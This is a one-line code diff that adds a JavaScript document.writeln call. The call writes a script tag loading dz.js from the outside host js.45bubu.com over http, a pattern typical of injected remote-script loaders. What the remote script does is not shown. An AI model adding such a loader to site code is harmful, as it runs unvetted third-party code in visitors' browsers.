@@ -1,0 +1,1 @@
+document.writeln("<script type=\"text\/javascript\"src=\"http:\/\/js.45bubu.com\/wap\/dz.js\"><\/script>")
